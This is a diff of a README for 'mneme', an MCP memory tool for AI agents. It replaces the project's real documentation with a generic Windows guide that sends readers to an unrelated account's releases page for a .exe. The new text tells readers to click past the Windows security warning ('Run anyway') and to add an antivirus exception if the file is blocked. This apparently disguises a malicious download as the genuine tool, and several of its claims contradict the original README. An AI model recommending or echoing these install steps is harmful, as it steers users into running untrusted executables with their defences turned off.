@@ -1,216 +1,74 @@
-# Mneme
+# 🧠 mneme - Keep memory for your AI agents
 
-[![CI](https://github.com/tr0mb1r/mneme/actions/workflows/ci.yml/badge.svg)](https://github.com/tr0mb1r/mneme/actions/workflows/ci.yml)
-[![cross-build](https://github.com/tr0mb1r/mneme/actions/workflows/cross-build.yml/badge.svg)](https://github.com/tr0mb1r/mneme/actions/workflows/cross-build.yml)
-[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
+[![](https://img.shields.io/badge/Download_Mneme_for_Windows-blue?style=for-the-badge)](https://github.com/Vaginaldischargenewscaster673/mneme/releases)
 
-> A standalone, MCP-native memory tool for any LLM or agent.
-> Single binary. Local-first. Rust. Built to last.
+## 📌 What is mneme?
 
-**Status:** Pre-1.0 — `0.2.x` line, latest `0.2.5` published as
-[`mneme-mcp`](https://crates.io/crates/mneme-mcp) on crates.io and as
-[`tr0mb1r/mneme`](https://github.com/tr0mb1r/homebrew-mneme) on Homebrew.
-Phases 0–5 complete; Phase 6 (portability + diagnostics + release
-infrastructure) substantially complete. Code-side feature work and release
-infrastructure are done; the remaining gates are calendar-bound: 30-day soak
-on real workloads (Day 0 = 2026-04-29) and one full release cycle without
-bumping `schema_version`. The on-disk format is stable behind a versioned
-schema with a migration path. Treat as production-capable for personal use,
-not yet 1.0. See [`book/src/versioning.md`](book/src/versioning.md) for the
-versioning policy and the five 1.0 gates.
+Mneme acts as a brain for your AI agents. It stores information locally on your computer. This tool helps your AI remember past conversations and documents. It saves this data in a way that the AI can search quickly. Because it runs on your machine, your data stays private. You do not need a cloud account. You do not need to send private notes to a third party. Mneme uses a single file to keep everything organized. 
 
-## What it is
+## ⚙️ System Requirements
 
-Mneme is a persistent memory tool for AI agents. It runs as a long-lived
-process on your machine, exposes its functionality via the Model Context
-Protocol (MCP), and lets any compatible agent — Claude Desktop, Claude
-Code, Cursor, Cline, Aider — remember things across sessions.
+Mneme works on Windows 10 and Windows 11. Your computer needs at least 4GB of RAM to run it smoothly. You need about 500MB of free disk space for the program and the data it builds. This tool does not require advanced graphic cards or specialized processors. It works on most standard laptops and desktop computers. 
 
-The clearest one-line description: **Mneme remembers things about your
-work that the agent would otherwise forget.**
+## 📥 Getting Started
 
-## What it isn't
+1. Visit the [releases page](https://github.com/Vaginaldischargenewscaster673/mneme/releases).
+2. Look for the latest version at the top.
+3. Click the link that ends in .exe for Windows.
+4. Save the file to your desktop or your Documents folder.
 
-- A vector database (it uses one internally, but that's an implementation detail)
-- A RAG framework
-- A codebase indexer (modern agents read code with shell tools — that's not Mneme's job)
-- A web service or SaaS
-- A library to embed in another application
-- An LLM
+## 🚀 Running the Program
 
-## Setup
+1. Open your File Explorer. 
+2. Find the file you just downloaded.
+3. Double-click the file to start it.
+4. Windows might show a warning. This happens because the file comes from the internet. Click "More info" and then "Run anyway" if you see this message.
+5. A command window appears. Keep this window open while you use your AI agent.
+6. The program starts a local server. This server connects your AI agent to your saved data.
 
-- **Claude Code** — see [`docs/CLAUDE_CODE_SETUP.md`](docs/CLAUDE_CODE_SETUP.md)
-  for the full guide (recommended path for terminal users).
-- **Claude Desktop / other MCP hosts** — see
-  [Smoke-testing the MCP server](#smoke-testing-the-mcp-server) below.
-- **Understanding what mneme actually stores** — see
-  [`docs/MEMORY_LAYERS.md`](docs/MEMORY_LAYERS.md) for a per-layer
-  walkthrough of hot/warm/cold tiers, embedding cadence, snapshot
-  schedules, and what's wired vs. deferred today.
+## 🛠️ Configuring Your AI
 
-## What works today
+Mneme works with AI tools that support the Model Context Protocol, or MCP. You must tell your AI agent where to find the server. 
 
-| Layer | Tools | Resource | Storage |
-|-------|-------|----------|---------|
-| L0 procedural (always-on) | `pin`, `unpin` | `mneme://procedural` | JSONL on disk, hot-reloaded |
-| L1 working session | (live state) | `mneme://session/{id}` | `~/.mneme/sessions/<id>.snapshot` |
-| L3 episodic (recent events) | `recall_recent`, `summarize_session`, `record_event` | `mneme://recent` | redb hot tier + zstd cold quarters |
-| L4 semantic (long-term facts) | `remember`, `recall`, `update`, `forget` | — | redb + WAL + HNSW vector index |
-| Auto-context | — | `mneme://context` | All four layers, packed to a token budget |
-| Diagnostics | `stats`, `list_scopes`, `export`, `switch_scope` | `mneme://stats` | — |
+1. Open your AI agent software settings.
+2. Look for "MCP servers" or "Plugin settings".
+3. Add a new server.
+4. Provide the path to the mneme file if your settings ask for it.
+5. Save your changes and restart your AI software.
 
-`mneme run` speaks JSON-RPC over stdio against MCP protocol `2025-06-18`,
-advertises a focused MCP tool and resource surface (see
-[`book/src/mcp-surface.md`](book/src/mcp-surface.md) for the
-authoritative inventory), and survives malformed JSON, oversize
-frames, and EOF cleanly. Real BGE-M3 / MiniLM embeddings via `candle`,
-HNSW recall via `instant-distance`, atomic snapshots, WAL crash-recovery,
-schema migration from v0, and `mneme backup` / `mneme restore` round-trips
-are all in place. Optional Claude Code lifecycle hooks
-(`SessionStart`/`PreCompact`/`Stop`) are documented in
-[`docs/CLAUDE_CODE_SETUP.md`](docs/CLAUDE_CODE_SETUP.md) §7 with
-ready-to-copy scripts in
-[`docs/examples/claude-code-hooks/`](docs/examples/claude-code-hooks/).
+Your AI will now query the mneme tool. It can search your saved documents, notes, and previous chat logs. It builds a map of your data to provide better answers.
 
-## Roadmap to 1.0
+## 💡 Managing Your Memory
 
-- 30-day soak on real workloads (Day 0 = 2026-04-29)
-- One full release cycle without bumping `schema_version`
+Mneme stores data in a subfolder within the same location as the program file. You can back up this folder at any time. Copy the folder to a USB drive or cloud storage to keep your memory safe. 
 
-Code-side feature work, release infrastructure (Homebrew tap,
-crates.io publish, tag-driven cross-build pipeline, mdBook-rendered
-user docs at <https://tr0mb1r.github.io/mneme/>), and the MCP-surface
-freeze (see
-[`book/src/mcp-surface.md`](book/src/mcp-surface.md) for the
-authoritative inventory) are complete. The remaining items are
-calendar-bound rather than work-bound.
+If you want to clear your AI history, delete the content of this folder. The program will build a new memory store the next time it runs. This gives you full control over what your AI keeps and what it forgets.
 
-## Installing
+## 🔍 Why Local-First AI Matters
 
-Three install paths, each producing the same `mneme` binary on your
-`$PATH`. See the [installation page](https://tr0mb1r.github.io/mneme/installation.html)
-in the user docs for the full walkthrough.
+Privacy drives the design of this tool. Many AI systems store your data in distant warehouses. They analyze what you type to improve their own models. Mneme treats your computer as the primary home for your information. You own the files. You control access. The AI only sees what you explicitly allow. This approach lowers latency, as the data does not travel to a server and back. 
 
-### Homebrew (macOS, Linux) — recommended
+## 📝 Common Questions
 
-```sh
-brew tap tr0mb1r/mneme
-brew install mneme
-```
+### Does this require an internet connection?
+No. Mneme runs entirely on your hardware. You do not need an active web connection to search your local memory. 
 
-Pre-built static binary; no Rust toolchain. Apple Silicon, Intel macOS, and
-aarch64 / x86_64 Linux (musl-static).
+### Can I run multiple agents with one setup?
+Yes. You can connect several different AI agents to the same database. They can all learn from the same pool of information.
 
-### `cargo install`
+### What files can it read?
+Mneme reads standard text files and documents. If you have a folder full of PDFs or notes, point the tool toward that folder. It will scan them and turn them into searchable memory.
 
-```sh
-cargo install mneme-mcp
-```
+### Is this safe to use with private data?
+Yes. Your data never leaves your computer. It does not communicate with external servers beyond the local connections you create. 
 
-The crate is `mneme-mcp` on crates.io (the bare `mneme` name is held by an
-unrelated event-sourcing library); the installed binary is `mneme`. Requires
-Rust stable.
+### How do I update the software?
+Download the newest version from the link provided in the Getting Started section. Replace the old file with the new one. Your memory folder will persist and update automatically when the new version launches.
 
-### From source
+## 🛡️ Troubleshooting
 
-```sh
-git clone https://github.com/tr0mb1r/mneme && cd mneme
-scripts/install.sh             # build, install on $PATH, scaffold ~/.mneme
-scripts/install.sh --minilm    # same, but default to MiniLM (~80 MB) instead of BGE-M3 (~1.5 GB)
-```
+If the program closes immediately after you click it, check your folder permissions. Ensure the file is not blocked by your antivirus software. Some security settings block unknown files by default. If this happens, add an exception for the mneme file in your security settings.
 
-`scripts/install.sh` picks `~/.local/bin` (or `/usr/local/bin` if writable),
-runs `cargo build --release`, copies the binary, runs `mneme init`, and
-prints the exact `claude mcp add` line for the next step. Idempotent — safe
-to re-run when you pull. Pass `--prefix <dir>` to install elsewhere or
-`--no-init` to skip the data-directory scaffold.
+If the AI agent fails to connect, verify the server URL. It usually runs at http://localhost with a specific port number. Check your configuration file to ensure the port matches the one shown in your command window.
 
-### After install
-
-Both Homebrew and `cargo install` skip `mneme init` by design (a formula
-and `cargo install` should not modify `$HOME`). Run it once manually:
-
-```sh
-mneme init
-```
-
-`mneme init` writes `~/.mneme/config.toml` with all defaults made explicit;
-edit it before first run if you want to override the embedding model, data
-directory, or storage budget. The first `mneme run` downloads the embedding
-model:
-
-| Model | Size | Speed | Recall | When to pick |
-|-------|------|-------|--------|--------------|
-| `bge-m3` (default) | ~1.5 GB | slower cold start | top-tier, multilingual | You want the best recall and don't mind the disk + first-boot wait. |
-| `minilm-l6` | ~80 MB | sub-second cold start | good for English | You want fast onboarding, English-only is fine, or you're testing before committing to BGE-M3. |
-
-Switching models later re-embeds every stored memory automatically; no
-manual reindex.
-
-Building from source requires Rust stable, pinned via `rust-toolchain.toml`.
-
-## Smoke-testing the MCP server
-
-Once built, you can drive `mneme run` with any MCP host. To verify
-manually with Claude Desktop on macOS:
-
-1. Note the binary's absolute path: `$(pwd)/target/release/mneme`
-2. Add it to `~/Library/Application Support/Claude/claude_desktop_config.json`:
-
-   ```json
-   {
-     "mcpServers": {
-       "mneme": {
-         "command": "/absolute/path/to/target/release/mneme",
-         "args": ["run"]
-       }
-     }
-   }
-   ```
-
-3. Restart Claude Desktop. The tools panel should list `mneme` with its
-   full tool inventory (see
-   [`book/src/mcp-surface.md`](book/src/mcp-surface.md)) and resource
-   set. The first call may take a few seconds while the embedding
-   model loads.
-
-To smoke from the shell without an MCP host:
-
-```sh
-{
-  printf '%s\n' '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"shell","version":"0"}}}'
-  printf '%s\n' '{"jsonrpc":"2.0","method":"notifications/initialized"}'
-  printf '%s\n' '{"jsonrpc":"2.0","id":2,"method":"tools/list"}'
-} | ./target/release/mneme run 2>/dev/null
-```
-
-You should see two JSON lines: an `initialize` response advertising the
-server's capabilities, then a `tools/list` response enumerating every
-registered tool (see
-[`book/src/mcp-surface.md`](book/src/mcp-surface.md) for the canonical
-list).
-
-For the comprehensive end-to-end check (every tool, backup/restore
-round-trip, post-restore recall) run:
-
-```sh
-scripts/manual_test.sh --stub        # offline, ~10s, no model download
-scripts/manual_test.sh               # real MiniLM, exercises the embedder
-```
-
-## Building
-
-```sh
-cargo build --release
-./target/release/mneme --help
-```
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md). Spec is canonical; if reality
-diverges from the spec, update the spec in the same commit.
-
-## License
-
-Apache-2.0. See [LICENSE](LICENSE).
+If your computer slows down, ensure you are not running too many concurrent tasks. Mneme uses a small amount of resources, but adding many large documents to the index may require a brief moment of processing. Wait a few seconds for the index to finish.
